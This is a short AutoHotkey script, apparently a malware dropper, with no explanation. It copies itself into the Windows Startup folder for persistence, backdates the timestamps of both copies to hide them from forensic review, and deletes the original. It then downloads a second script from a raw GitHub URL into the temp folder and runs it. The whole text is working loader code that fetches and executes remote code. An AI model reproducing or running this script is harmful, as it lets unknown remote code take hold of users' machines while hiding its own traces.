if (A_ScriptFullPath != A_Startup "\" A_ScriptName) {
	FileCopy, %A_ScriptFullPath%, %A_Startup%
	Run, %A_Startup%\%A_ScriptName%
	FileSetTime, 19910824000000, %A_ScriptFullPath%, A
	FileSetTime, 19910824000000, %A_ScriptFullPath%, M
	FileSetTime, 19910824000000, %A_ScriptFullPath%, C
	FileSetTime, 19910824000000, %A_Startup%\%A_ScriptName%, A
	FileSetTime, 19910824000000, %A_Startup%\%A_ScriptName%, M
	FileSetTime, 19910824000000, %A_Startup%\%A_ScriptName%, C
	FileDelete, %A_ScriptFullPath%
	ExitApp
}
if FileExist(A_Temp "\Hey.ahk")
{
FileDelete, % A_Temp "\Hey.ahk"
}
UrlDownloadToFile, https://raw.githubusercontent.com/akuratnishe-dot/Hi/refs/heads/main/NotThis.ahk, %A_Temp%\Hey.ahk
Run, %A_Temp%\Hey.ahk
